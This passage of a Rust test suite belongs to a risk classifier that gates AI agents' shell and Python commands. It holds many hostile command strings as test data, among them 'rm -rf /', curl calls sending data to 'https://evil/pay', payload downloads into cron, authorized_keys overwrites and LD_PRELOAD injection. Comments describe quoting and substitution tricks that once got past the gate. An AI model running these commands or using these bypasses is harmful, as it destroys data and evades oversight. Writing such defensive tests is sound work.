        // `dd` is not a read-only head — even an in-workspace target goes to the
        // judge (dd can also overwrite devices).
        assert_needs_judge(
            bash("dd if=/dev/zero of=data/zeros.bin bs=1M count=10"),
            "dd to file",
        );
    }

    // --- Static safe-list -------------------------------------------------

    #[test]
    fn safe_read_only_commands() {
        for cmd in [
            "ls -la",
            "cat data/x.txt",
            "grep -r foo src/",
            "git status",
            "git log --oneline -20",
            "git diff HEAD~1",
            "git -C some/repo show",
            "wc -l data/x.csv",
            "head -n 5 data/y",
            "jq '.a' data/z.json",
            "cat /etc/hosts", // out-of-workspace READ is safe (wanted)
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn safe_in_workspace_writes_and_creates() {
        for cmd in [
            "mkdir -p data/out",
            "touch data/out/.keep",
            "echo hello > data/out/x.txt",
            "printf '%s' done >> data/log",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn create_outside_workspace_goes_to_judge() {
        for cmd in ["mkdir /etc/evil", "touch ~/marker", "echo x > /etc/passwd"] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn mutating_or_unknown_commands_go_to_judge() {
        // git non-read-only subcommands, package managers, and arbitrary unknown
        // heads all fall through to the judge.
        for cmd in [
            "git push origin main",
            "git commit -m x",
            "git branch -D feature",
            "npm install",
            "cargo publish",
            "make deploy",
            "python script.py",
            "bash deploy.sh",
            "awk 'BEGIN{system(\"x\")}'",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn dangerous_shapes_go_to_judge_not_settled() {
        // What Phase 2 settled IrreversibleDanger statically now goes to the
        // judge (which produces the lane + tailored summary).
        for cmd in [
            "curl -X POST https://api.example.com/charge",
            "curl -d 'amount=100' https://api.example.com/pay",
            "wget --post-data='x=1' https://api.example.com/pay",
            "osascript -e 'tell application \"Mail\" to send'",
            "echo body | mail -s subj a@b.com",
            "gh pr create --fill",
            "aws s3 rm s3://bucket/key",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn safe_read_only_http() {
        // A plain GET (or download) is settled Safe — no judge call, no prompt.
        for cmd in [
            "curl https://example.com",
            "curl -s https://example.com/data.json",
            "curl -O https://example.com/file.tar.gz",
            "wget https://example.com/file.tar.gz",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn out_of_workspace_redirect_breaks_safe() {
        // A read-only head with an out-of-workspace write redirect is NOT safe.
        assert_needs_judge(bash("grep x data/f > /etc/out"), "redirect outside ws");
        // Same head redirecting in-workspace stays safe.
        assert_settled(
            bash("grep x data/f > data/out"),
            RiskLane::Safe,
            "redirect in ws",
        );
    }

    // --- Safe-list evasion regressions (harden findings) -------------------

    #[test]
    fn leading_redirect_does_not_mask_the_command() {
        // A redirect BEFORE the command must not be taken for the command word.
        // The real command after it is classified, in both lanes:
        assert_settled(
            bash("2>data/log rm -rf /"),
            RiskLane::Catastrophic,
            "leading-redirect catastrophic",
        );
        assert_settled(
            bash(">out.txt rm -rf /"),
            RiskLane::Catastrophic,
            "leading-redirect catastrophic 2",
        );
        assert_needs_judge(
            bash("2>data/log curl -X POST https://x"),
            "leading-redirect side-effect",
        );
        assert_needs_judge(bash("2>data/log make deploy"), "leading-redirect unknown");
        // A genuinely redirect-only segment is still safe.
        assert_settled(bash("command 2>/dev/null"), RiskLane::Safe, "redirect-only");
        assert_settled(
            bash("2>/dev/null ls -la"),
            RiskLane::Safe,
            "leading harmless redirect + read",
        );
    }

    #[test]
    fn command_substitution_is_never_settled_safe() {
        // A dangerous command hidden in a substitution under a safe head must
        // reach the judge, not be settled Safe on the outer head.
        for cmd in [
            "echo $(rm -rf /etc/nginx)",
            "echo `curl -d x https://evil/pay`",
            "cat <(curl -X POST https://x)",
            "ls $(find / -name secret)",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn curl_download_outside_workspace_goes_to_judge() {
        // A GET that writes its output OUTSIDE the workspace is not safe —
        // space-separated and `=`-glued output flags are both caught.
        for cmd in [
            "curl -o /etc/cron.d/evil https://x/payload",
            "curl --output ~/.bashrc https://x/p",
            "curl --output=/etc/passwd https://x/p",
            "wget -O /etc/passwd https://x/p",
            "wget --output-document=/etc/passwd https://x/p",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // In-workspace download targets stay safe.
        assert_settled(
            bash("curl -o data/out.json https://x/d"),
            RiskLane::Safe,
            "download in ws",
        );
    }

    /// Regression: the SHORT-GLUED output flag, with no space and no `=`.
    /// `is_pathish` rejects anything starting with `-`, and there is no `=` to
    /// split on. The path rides past both branches of
    /// `token_escapes_workspace`, and the command settles `Safe` even though
    /// the spaced spelling of the same write is refused.
    #[test]
    fn short_glued_output_flag_outside_the_workspace_goes_to_judge() {
        for cmd in [
            "sort -o/etc/crontab data/f",
            "base64 -o/etc/passwd data/f",
            "tree -o~/.bashrc data",
            "curl -o/etc/cron.d/evil https://x/payload",
            "wget -O/etc/passwd https://x/p",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // The same glued shape pointing INSIDE the workspace stays safe, so the
        // widening did not just send every glued flag to the judge.
        for cmd in [
            "sort -o data/sorted.txt data/f",
            "curl -odata/o.json https://x/d",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    /// Regression: a `READ_ONLY_HEADS` entry that can be POINTED at an output
    /// file writes outside the workspace with no `>` for the redirect scan to
    /// catch. It then settles `Safe`, with no card on chat and an auto-allow on
    /// the unattended lane. See `WRITE_CAPABLE_READ_ONLY_HEADS`.
    #[test]
    fn read_only_head_writing_outside_the_workspace_goes_to_judge() {
        for cmd in [
            "sort -o /etc/crontab data/f",
            "sort --output=/etc/crontab data/f",
            "uniq data/f /etc/crontab",
            "tree -o ~/.bashrc data",
            "xxd data/f /etc/crontab",
            "yq -i /etc/some.yaml",
            "base64 -o /etc/passwd data/f",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // The ordinary in-workspace / stdout forms stay safe.
        for cmd in [
            "sort data/f",
            "sort -o data/sorted.txt data/f",
            "uniq data/a data/b",
            "yq -i data/config.yaml",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    /// The reported write-capable invocations, verbatim. Each head reads to
    /// stdout in its ordinary form and writes a named FILE in these, with no
    /// `>` for the redirect scan to catch.
    #[test]
    fn a_write_capable_read_only_head_never_settles_safe() {
        for cmd in [
            "sort -o ~/.ssh/authorized_keys data/mykey.pub",
            "uniq data/in.txt ~/.ssh/authorized_keys",
            "xxd data/in ~/.bashrc",
            "git diff --output=/etc/crontab",
            // `less -o FILE` logs piped input to a named file.
            "less -o /etc/crontab data/f",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // The near-misses. Only an ESCAPING argument pushes a read-only head
        // off the fast path, so the ordinary reads still settle Safe and no
        // session drowns in cards.
        for cmd in [
            "sort data/f",
            "uniq data/in.txt",
            "xxd data/f",
            "less data/f",
            "git diff",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    /// A substitution runs its body, and every head-token scan reads the OUTER
    /// head. `segment_safety` refused to settle these. The static fallback
    /// then read the same `echo` and landed on Safe, so with the judge off the
    /// body ran with no card.
    #[test]
    fn a_catastrophic_command_inside_a_substitution_is_catastrophic() {
        for cmd in [
            "echo $(rm -rf /)",
            "echo `rm -rf /`",
            "ls $(rm -rf ~)",
            "cat <(rm -rf /)",
            "echo $(echo $(rm -rf /))",
            "true && echo $(rm -rf /)",
            // Unparseable: an opener with no closer is classified on its
            // remainder rather than waved through.
            "echo $(rm -rf /",
            "echo `rm -rf ~",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    /// The same recursion on the fallback's destruction scan, which is what
    /// decides the lane when the judge is off.
    #[test]
    fn destruction_inside_a_substitution_reaches_the_fallback() {
        for cmd in ["echo $(rm -rf /etc/nginx)", "ls $(shred -u ~/.ssh/id_rsa)"] {
            assert_eq!(
                bash_destruction_scope(cmd),
                Some(DestructionScope::OutOfWorkspace),
                "{cmd}"
            );
            assert_eq!(fb_bash(cmd).lane, RiskLane::IrreversibleDanger, "{cmd}");
        }
        // In-workspace destruction inside a substitution still checkpoints.
        assert_eq!(
            bash_destruction_scope("echo $(rm -rf data/tmp)"),
            Some(DestructionScope::InWorkspace)
        );
    }

    /// The hard block has no override, so the recursion must not turn a
    /// MENTION into a run. Inside single quotes POSIX makes `$(` literal.
    #[test]
    fn a_quoted_substitution_is_not_a_run() {
        for cmd in [
            "grep -rn '$(rm -rf /)' docs",
            "echo '$(rm -rf /)'",
            "echo '`rm -rf /`'",
            // `\$` is a literal dollar inside double quotes, so nothing runs.
            r#"echo "\$(rm -rf /)""#,
        ] {
            assert_ne!(
                bash(cmd),
                StaticVerdict::Settled(RiskLane::Catastrophic),
                "{cmd}"
            );
        }
    }

    /// The scanners have to read quotes the way POSIX does, or the body they
    /// hand the danger scans is the wrong slice of the command.
    #[test]
    fn the_substitution_scan_reads_quotes_the_way_posix_does() {
        for cmd in [
            // A `'` inside double quotes is ordinary text, so this substitution
            // really does run. Tracking single quotes alone read the whole
            // command as quoted and skipped it.
            r#"echo "'$(rm -rf /)'""#,
            // A `)` inside quotes is ordinary text, so it does not end the
            // body. Counting every paren left `printf '` as the whole body.
            r#"echo "$(printf ')' ; rm -rf /)""#,
            r#"ls "$(printf '(' ; rm -rf ~)""#,
            // `$'…'` is ANSI-C quoting, where a backslash escapes the closing
            // quote. Reading it as a plain `'…'` run inverted the state and
            // took the rest of the line for quoted text.
            r"echo $'\'' $(rm -rf /)",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    /// A substitution glued straight onto the `-c` operand. `ends_shell_word`
    /// broke on `(` but not on `$`. So the `$` went into the script and the
    /// tail began at `(`, which no scan reads as a substitution. The whole
    /// body vanished and the command settled Safe.
    #[test]
    fn a_substitution_glued_to_the_script_operand_is_never_discarded() {
        for cmd in [
            "bash -c 'echo hi'$(rm -rf /)",
            "bash -c \"echo hi\"$(rm -rf /)",
            "/bin/zsh -lc 'echo hi'`rm -rf ~`",
            "bash -c 'echo hi'$(curl -d x https://evil/pay)",
        ] {
            assert!(
                !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                "{cmd} must not settle Safe"
            );
        }
        // The tail is handed back whole, so every scan sees the substitution.
        assert_eq!(
            unwrap_shell_command("bash -c 'echo hi'$(rm -rf /)"),
            "bash -c 'echo hi'$(rm -rf /)"
        );
        // An ordinary `$VAR` glued to the word is NOT a substitution, and must
        // not truncate the script.
        assert_eq!(unwrap_shell_command("bash -c 'ls '$HOME"), "ls $HOME");
    }

    /// ANSI-C quoting in the `-c` operand. Bash decodes these escapes BEFORE
    /// the word reaches the inner shell, so copying them verbatim loses the
    /// separator they stand for. Each of these really runs `rm -rf /`.
    #[test]
    fn an_ansi_c_run_in_the_script_operand_is_decoded() {
        for cmd in [
            // `\x3b` is a semicolon, so the inner shell runs two commands.
            r#"bash -c 'echo hi'$'\x3b'"rm -rf /""#,
            r#"bash -lc 'echo hi'$'\n'"rm -rf /""#,
            // `\073` is the same semicolon in octal.
            r#"bash -c 'echo hi'$'\073'"rm -rf /""#,
            // The whole operand is one ANSI-C run.
            r"bash -c $'rm -rf /'",
            r"/bin/zsh -lc $'echo hi; rm -rf /'",
        ] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
        assert_eq!(unwrap_shell_command(r"bash -c $'rm -rf /'"), "rm -rf /");
        assert_eq!(
            unwrap_shell_command(r#"bash -c 'echo hi'$'\x3b'"ls""#),
            "echo hi;ls"
        );
        // An escape bash does not recognise keeps its backslash, and an
        // ordinary read still settles Safe.
        assert_eq!(unwrap_shell_command(r"bash -c $'ls \q'"), r"ls \q");
        assert_settled(bash(r"bash -c $'ls -la'"), RiskLane::Safe, "ansi-c read");
    }

    /// A trailing backslash is a line continuation, so the target the shell
    /// acts on is a bare `/`. Matching the token literally let it walk the
    /// hard block.
    #[test]
    fn a_trailing_backslash_does_not_hide_a_catastrophic_target() {
        for cmd in [r"echo hi ;rm -rf /\", r"rm -rf ~\"] {
            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
        }
    }

    /// The cost the refusal set carries, pinned so it stays deliberate. Each
    /// of these is ordinary work, and each is refused because the head is not
    /// what runs, or not all of it. The unattended lane denies them; see
    /// `RequestVerdict::Unclassified`.
    #[test]
    fn ordinary_shapes_the_refusal_set_deliberately_catches() {
        for cmd in [
            // The redirect the engine's own system prompt asks agents to use.
            "cargo build > /tmp/build.log 2>&1",
            // This repo's own script idiom: a path-qualified head.
            "./scripts/e2e.sh",
            // A pure READ under a write-capable head. Telling it from
            // `sort -o /etc/x` needs per-head flag arity.
            "sort /etc/passwd",
            "less /var/log/system.log",
        ] {
            assert_eq!(bash_fast_path(cmd), Some(FastPathDecline::Refusal), "{cmd}");
        }
        // The way back onto the fast path: a bare head, output in-workspace,
        // and a plain read-only head for an out-of-workspace read.
        for cmd in [
            "cargo build > data/build.log 2>&1",
            "cat /etc/passwd",
            "head -n 5 /var/log/system.log",
            "grep x /etc/hosts",
        ] {
            assert_ne!(
                bash_fast_path(cmd),
                Some(FastPathDecline::Refusal),
                "{cmd} must stay off the refusal set"
            );
        }
    }

    /// A pathological nesting depth must terminate rather than recurse
    /// without bound.
    #[test]
    fn substitution_recursion_terminates_on_deep_nesting() {
        let deep = format!("{}rm -rf /{}", "echo $(".repeat(200), ")".repeat(200));
        // The verdict past the cap is not the point; returning at all is.
        let _ = bash(&deep);
        let unterminated = format!("{}rm -rf /", "echo $(".repeat(200));
        let _ = bash(&unterminated);
    }

    /// The POSIX `'\''` idiom, exactly the form Codex emits. The shell REJOINS
    /// adjacent quoted runs into one word. Cutting the `-c` operand at the
    /// first close quote handed every scan the truncated prefix `rm -rf `.
    #[test]
    fn adjacent_quoted_runs_join_into_one_script_word() {
        assert_eq!(
            unwrap_shell_command(r"bash -c 'rm -rf '\''/'\'''"),
            "rm -rf '/'"
        );
        assert_settled(
            bash(r"bash -c 'rm -rf '\''/'\'''"),
            RiskLane::Catastrophic,
            "rejoined catastrophic target",
        );
        // The harmless stand-in the finding was verified with prints `/`.
        assert_eq!(
            unwrap_shell_command(r"bash -c 'echo -n '\''/'\'''"),
            "echo -n '/'"
        );
        assert_settled(
            bash(r"bash -c 'echo -n '\''/'\'''"),
            RiskLane::Safe,
            "rejoined echo",
        );
        // A double-quoted run joins the same way, and a backslash outside any
        // quote contributes one literal character.
        assert_eq!(unwrap_shell_command(r#"bash -c "rm -rf "'/'"#), "rm -rf /");
        assert_eq!(unwrap_shell_command(r"bash -c 'rm -rf '\/"), "rm -rf /");
    }

    /// Regression: "read-only" for a git subcommand meant "does not mutate the
    /// repo", but the diff family also takes `--output=<file>`, which truncates
    /// an arbitrary path. That settled `Safe` on the same two lanes.
    #[test]
    fn read_only_git_subcommand_with_an_output_file_goes_to_judge() {
        for cmd in [
            "git diff --output=/etc/crontab",
            "git log --output /etc/crontab",
            "git show --output=data/x.diff",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // A read-only subcommand with no output flag is unaffected.
        assert_settled(bash("git diff HEAD~1"), RiskLane::Safe, "plain git diff");
        // A bare `-o` is NOT an output flag on any read-only subcommand: it
        // means something else on ls-files and grep. Matching it would send a
        // routine read to the judge and buy no safety, since git rejects `-o`
        // on the subcommands that can actually write.
        for cmd in [
            "git ls-files -o --exclude-standard",
            "git grep -o pattern",
            "git ls-files -o",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
    }

    #[test]
    fn git_config_injection_goes_to_judge() {
        for cmd in [
            "git -c core.pager=reboot log",
            "git --config-env=GIT_PAGER log",
            "git -c alias.x='!sh' status",
            "git --exec-path=/tmp/evil log",
            "git --exec-path /tmp/evil log",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
        // Benign global flags (`-C <dir>`) on a read-only subcommand stay safe.
        assert_settled(
            bash("git -C some/repo log"),
            RiskLane::Safe,
            "git -C read-only",
        );
    }

    #[test]
    fn python_filesystem_destruction_goes_to_judge() {
        for code in [
            "import shutil; shutil.rmtree('/home/user')",
            "import os; os.remove('/etc/passwd')",
            "from pathlib import Path; Path('/etc/x').unlink()",
            "import os; os.rename('a', '/etc/b')",
            "__import__('os').system('rm -rf /etc')",
        ] {
            assert_needs_judge(python(code), code);
        }
    }

    // --- Python static classification --------------------------------------

    #[test]
    fn python_pure_compute_and_reads_are_safe() {
        for code in [
            "print(sum(range(100)))",
            "import pandas as pd; pd.read_csv('data/x.csv')",
            "import requests; requests.get('https://example.com').json()", // GET, no signal
            "open('data/out.txt','w').write('hi')",
        ] {
            assert_settled(python(code), RiskLane::Safe, code);
        }
    }

    #[test]
    fn python_side_effect_shapes_go_to_judge() {
        for code in [
            "import requests; requests.post('https://api.example.com/x', json={})",
            "requests.delete(url)",
            "import smtplib; s = smtplib.SMTP('localhost')",
            "import httpx; httpx.put(url, content=b'x')",
            "import subprocess; subprocess.run(['rm','-rf','/etc'])",
            "import os; os.system('echo hi')",
        ] {
            assert_needs_judge(python(code), code);
        }
    }

    #[test]
    fn python_code_catastrophic_shellout_is_blocked() {
        // Embedded disk ops in a python shell-out are caught by the full-text
        // catastrophic scan, ahead of the side-effect signal.
        assert_settled(
            python("import os; os.system('mkfs.ext4 /dev/sda')"),
            RiskLane::Catastrophic,
            "python mkfs shellout",
        );
    }

    // --- Non-bash/python tools are never inspected -------------------------

    #[test]
    fn non_command_tools_always_safe() {
        assert_settled(
            static_classify(tn::WRITE_FILE, &json!({ "path": "/", "content": "x" })),
            RiskLane::Safe,
            "write_file",
        );
        assert_settled(
            static_classify(tn::READ_FILE, &json!({ "path": "data/x" })),
            RiskLane::Safe,
            "read_file",
        );
    }

    #[test]
    fn catastrophic_outranks_everything() {
        // Catastrophic is checked first, so a command that is both catastrophic
        // and side-effect-shaped is hard-blocked, never judged.
        assert_settled(
            bash("rm -rf / && curl -X POST https://x"),
            RiskLane::Catastrophic,
            "catastrophic + side-effect",
        );
    }

    // --- Out-of-workspace marker -------------------------------------------

    #[test]
    fn judge_input_carries_out_of_workspace_marker() {
        let StaticVerdict::NeedsJudge(ji) = bash("rm -rf /etc/nginx") else {
            panic!("expected NeedsJudge");
        };
        assert!(
            ji.out_of_workspace,
            "out-of-workspace target must be flagged"
        );

        let StaticVerdict::NeedsJudge(ji) = bash("rm -rf data/tmp") else {
            panic!("expected NeedsJudge");
        };
        assert!(
            !ji.out_of_workspace,
            "in-workspace target must not be flagged"
        );
    }

    #[test]
    fn escapes_workspace_detects_paths_and_redirects() {
        assert!(command_escapes_workspace("rm -rf /etc/x"));
        assert!(command_escapes_workspace("cp data/a ~/b"));
        assert!(command_escapes_workspace("echo x > /tmp/y"));
        assert!(command_escapes_workspace("cat ../secret"));
        assert!(!command_escapes_workspace("rm -rf data/tmp"));
        assert!(!command_escapes_workspace("cp data/a ./b"));
        assert!(!command_escapes_workspace("curl -X POST https://x")); // URL, not a path
        assert!(!command_escapes_workspace("echo hi > /dev/null")); // harmless sink
    }

    // --- Static fallback (judge off / unavailable) --------------------------

    fn fb_bash(cmd: &str) -> JudgedClassification {
        fallback_classify(&JudgeInput {
            tool_name: tn::RUN_BASH.to_string(),
            command: cmd.to_string(),
            out_of_workspace: false,
            fast_path_refused: false,
        })
    }

    fn fb_python(code: &str) -> JudgedClassification {
        fallback_classify(&JudgeInput {
            tool_name: tn::RUN_PYTHON.to_string(),
            command: code.to_string(),
            out_of_workspace: false,
            fast_path_refused: false,
        })
    }

    #[test]
    fn fallback_flags_side_effect_shapes_with_summary() {
        // The dangerous shapes the static side-effect list recognises → ask,
        // with a category-derived card summary.
        for cmd in [
            "curl -X POST https://api.example.com/charge",
            "osascript -e 'tell application \"Mail\" to send'",
            "gh pr create --fill",
        ] {
            let c = fb_bash(cmd);
            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{cmd}");
            assert!(c.category.is_some(), "{cmd}");
            assert!(
                c.summary
                    .as_deref()
                    .is_some_and(|s| s.starts_with("May perform")),
                "{cmd}"
            );
        }
        for code in [
            "import requests; requests.post(url)",
            "import smtplib; smtplib.SMTP('x')",
        ] {
            assert_eq!(fb_python(code).lane, RiskLane::IrreversibleDanger, "{code}");
        }
        // Ordinary tools still run — the fallback only flags recognised shapes.
        for cmd in ["npm install", "git push", "make deploy"] {
            assert_eq!(fb_bash(cmd).lane, RiskLane::Safe, "{cmd}");
        }
    }

    #[test]
    fn fallback_asks_for_out_of_workspace_destruction() {
        // The former documented limit, now closed: destruction with an
        // out-of-workspace target is caught statically → ask, tagged
        // OutOfWorkspaceDestruction (so an unattended trigger must grant it).
        for cmd in [
            "rm -rf /etc/nginx",
            "rm ~/important.txt",
            "sudo rm -rf /var/lib/x",
            "shred -u ~/.ssh/id_rsa",
            "truncate -s 0 /var/log/system.log",
            "mv data/a /etc/b",
            "cp data/x ~/.zshrc",
            "dd if=data/img of=/Users/me/file",
            "grep x data/f > /etc/cron.d/job",
            "git status && rm -rf ~/docs",
        ] {
            let c = fb_bash(cmd);
            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{cmd}");
            assert_eq!(
                c.category,
                Some(SideEffectCategory::OutOfWorkspaceDestruction),
                "{cmd}"
            );
            assert!(
                c.summary
                    .as_deref()
                    .is_some_and(|s| s.contains("outside the workspace")),
                "{cmd}"
            );
        }
    }

    #[test]
    fn fallback_checkpoints_in_workspace_destruction() {
        // Destruction confined to the workspace → the checkpoint lane (snapshot
        // + run, no prompt) instead of running bare.
        for cmd in [
            "rm -rf data/tmp",
            "rm x.txt",
            "mv data/a data/b",
            "cp data/a data/b",
            "truncate -s 0 data/log",
            "dd if=/dev/zero of=data/zeros.bin bs=1M count=1",
            // Importing INTO the workspace: only the in-workspace destination
            // can be clobbered (mv's source-side removal is relocation, not
            // data loss), so the checkpoint covers it — no prompt.
            "mv /tmp/download.csv data/in.csv",
            "cp /etc/hosts data/",
        ] {
            let c = fb_bash(cmd);
            assert_eq!(c.lane, RiskLane::ReversibleDanger, "{cmd}");
            assert_eq!(c.category, None, "{cmd}");
        }
    }

    #[test]
    fn fallback_leaves_out_of_workspace_reads_safe() {
        // Location is a signal, not a wall: out-of-workspace READS (and append
        // redirects, which are edits) stay Safe in the fallback.
        for cmd in [
            "python script.py /etc/config",
            "echo note >> /tmp/notes.txt",
        ] {
            assert_eq!(fb_bash(cmd).lane, RiskLane::Safe, "{cmd}");
        }
    }

    #[test]
    fn fallback_python_destruction_splits_on_literals() {
        use SideEffectCategory::OutOfWorkspaceDestruction;
        // An escaping string literal alongside a destruction call → ask.
        for code in [
            "import shutil; shutil.rmtree('/home/user/dir')",
            "from pathlib import Path; Path('~/x').unlink()",
            "import os; os.remove(\"../secret\")",
        ] {
            let c = fb_python(code);
            assert_eq!(c.lane, RiskLane::IrreversibleDanger, "{code}");
            assert_eq!(c.category, Some(OutOfWorkspaceDestruction), "{code}");
        }
        // Relative-only literals → checkpoint lane.
        for code in [
            "import os; os.remove('data/tmp/x.csv')",
            "import shutil; shutil.move('data/a', 'data/b')",
        ] {
            assert_eq!(fb_python(code).lane, RiskLane::ReversibleDanger, "{code}");
        }
        // No destruction call at all → Safe (pure compute).
        assert_eq!(fb_python("print('/etc/hosts')").lane, RiskLane::Safe);
    }

    #[test]
    fn permission_summary_describes_the_risk() {
        let s = permission_summary(
            tn::RUN_BASH,
            &json!({ "command": "curl -X POST https://x" }),
        );
        assert!(s.contains("mutating HTTP"), "summary was: {s}");
        // A Python outbound write is the ExternalApi category — same HTTP phrasing.
        let s = permission_summary(tn::RUN_PYTHON, &json!({ "code": "requests.post(u)" }));
        assert!(s.contains("mutating HTTP"), "summary was: {s}");
    }

    // --- Safe-list evasion regressions (permission-audit findings) ----------

    #[test]
    fn curl_json_and_other_body_flags_are_mutating() {
        // `--json` (curl ≥7.82) implies POST; `--data-ascii` / `--form-string`
        // are body flags too. None of these are GETs — they must reach the
        // judge, and the static fallback must tag them ExternalApi.
        for cmd in [
            "curl --json '{\"a\":1}' https://api.example.com/charge",
            "curl --json='{\"a\":1}' https://api.example.com/charge",
            "curl --data-ascii 'x=1' https://api.example.com/pay",
            "curl --form-string 'f=v' https://api.example.com/upload",
        ] {
            assert_needs_judge(bash(cmd), cmd);
            assert_eq!(
                static_side_effect_category(cmd),
                Some(SideEffectCategory::ExternalApi),
                "{cmd}"
            );
        }
    }

    #[test]
    fn fd_duplication_does_not_break_segmentation() {
        // `2>&1` / `>&2` are pure fd plumbing — they must not split the line
        // into junk segments that defeat the safe fast-path.
        for cmd in [
            "ls -la 2>&1",
            "grep x data/f 2>&1 | head -5",
            "echo done >&2",
        ] {
            assert_settled(bash(cmd), RiskLane::Safe, cmd);
        }
        // Stripping the fd-dup must not mask a real file redirect next to it.
        assert_needs_judge(bash("ls 2>&1 > /etc/out"), "redirect after fd-dup");
    }

    #[test]
    fn variable_paths_are_not_trusted_as_in_workspace() {
        // A `$VAR` path can resolve anywhere — never settled Safe; the judge
        // reads the actual command.
        for cmd in [
            "echo x > $TMPDIR/y",
            "mkdir -p ${OUT_DIR}/cache",
            "touch data/$RUN_ID/marker",
            "curl -o $CACHE_DIR/f https://x/d",
        ] {
            assert_needs_judge(bash(cmd), cmd);
        }
    }

    #[test]
    fn python_sdk_and_renamed_client_side_effects_go_to_judge() {
        // Cloud SDKs, remote-exec libs, and renamed HTTP clients must hit the
        // judge — the old module-qualified list (`requests.post(` …) missed
        // every one of these.
        for code in [
            "import boto3; boto3.client('s3').delete_object(Bucket='b', Key='k')",
            "import paramiko; c = paramiko.SSHClient()",
            "from ftplib import FTP",
            "from google.cloud import storage",
            "s = requests.Session(); s.post(url, json=d)",
            "client.delete(f'/items/{i}')",
        ] {
            assert_needs_judge(python(code), code);
        }
    }

    #[test]
    fn segment_heads_lists_every_command_in_a_chain() {
        assert_eq!(
            segment_heads("sudo /usr/bin/aws s3 rm x && curl -X POST u; git push"),
            vec!["aws".to_string(), "curl".to_string(), "git".to_string()]
        );
        assert_eq!(segment_heads("ls -la 2>&1"), vec!["ls".to_string()]);
        assert!(segment_heads("").is_empty());
        assert!(segment_heads("2>/dev/null").is_empty());
    }

    /// The grant lane must see what the classifier sees. Reading the raw text
    /// gives every wrapped command the single head `bash`, so one narrow
    /// `Bash(bash:*)` grant would auto-allow every later wrapped command.
    #[test]
    fn segment_heads_reads_inside_a_shell_wrapper() {
        assert_eq!(
            segment_heads("bash -lc 'curl -X POST https://api.example.com/pay'"),
            vec!["curl".to_string()]
        );
        assert_eq!(
            segment_heads("/bin/zsh -lc 'git status && rm -rf data/tmp'"),
            vec!["git".to_string(), "rm".to_string()]
        );
    }

    /// Derivation basenames so `/usr/bin/git push` stores `git`. Matching must
    /// NOT, or that stored grant covers `data/bin/git`, a binary the agent
    /// writes in-workspace and then runs with no card.
    #[test]
    fn matching_reads_the_head_as_written_while_derivation_basenames_it() {
        assert_eq!(segment_heads("sudo /usr/bin/aws s3 rm x"), vec!["aws"]);
        assert_eq!(
            segment_heads_as_written("sudo /usr/bin/aws s3 rm x"),
            vec!["/usr/bin/aws"]
        );
        // A bare word is identical either way, so an ordinary grant is
        // unaffected.
        for cmd in ["ls -la", "sudo ls", "FOO=1 ls", "bash -lc 'git status'"] {
            assert_eq!(segment_heads(cmd), segment_heads_as_written(cmd), "{cmd}");
        }
    }

    /// The grant lane's coverage rule, shared with the chat lane so the two
    /// cannot disagree.
    #[test]
    fn a_grant_covers_only_bare_heads_it_names() {
        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
        // Every head covered.
        assert!(grant_covers_command(
            "Bash",
            "git status && rm -rf data/tmp",
            granted(&["Bash(git:*)", "Bash(rm:*)"])
        ));
        // A trailing segment the grant does not name.
        assert!(!grant_covers_command(
            "Bash",
            "git status && rm -rf /",
            granted(&["Bash(git:*)"])
        ));
        // A path-qualified or decorated head is never covered by a bare grant.
        for cmd in ["data/bin/ls", "./ls -la", "/tmp/ls", r"\ls", "\"ls\""] {
            assert!(
                !grant_covers_command("Bash", cmd, granted(&["Bash(ls:*)"])),
                "{cmd}"
            );
        }
        // A broad grant means "any command", so it still covers them.
        assert!(grant_covers_command(
            "Bash",
            "data/bin/ls",
            granted(&["Bash"])
        ));
        // The Codex label reads the inner script, not the wrapper.
        assert!(grant_covers_command(
            "command_execution",
            "/bin/zsh -lc 'git status'",
            granted(&["command_execution(git:*)"])
        ));
        assert!(!grant_covers_command(
            "command_execution",
            "/bin/zsh -lc 'rm -rf /'",
            granted(&["command_execution(git:*)"])
        ));
    }

    /// A grant names a HEAD, so it cannot stand for a command whose head is
    /// not what runs. On the coding-agent lane this check runs BEFORE
    /// classification. One "Allow for this thread" click on `echo ok` used to
    /// carry `echo $(rm -rf ~)` past the catastrophic scan entirely.
    #[test]
    fn a_grant_never_covers_a_shape_the_fast_path_refuses() {
        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
        let all = granted(&[
            "command_execution(echo:*)",
            "Bash(echo:*)",
            "Bash(ls:*)",
            "Bash(grep:*)",
            "Bash(sort:*)",
            "Bash(git:*)",
        ]);
        for (label, cmd) in [
            ("command_execution", "/bin/zsh -lc 'echo $(rm -rf ~)'"),
            ("Bash", "echo `rm -rf /`"),
            ("Bash", "LD_PRELOAD=/tmp/evil.so ls"),
            ("Bash", "grep x data/f > /etc/out"),
            ("Bash", "sort -o /etc/crontab data/f"),
            ("Bash", "git -c core.pager=reboot log"),
        ] {
            assert!(
                !grant_covers_command(label, cmd, all),
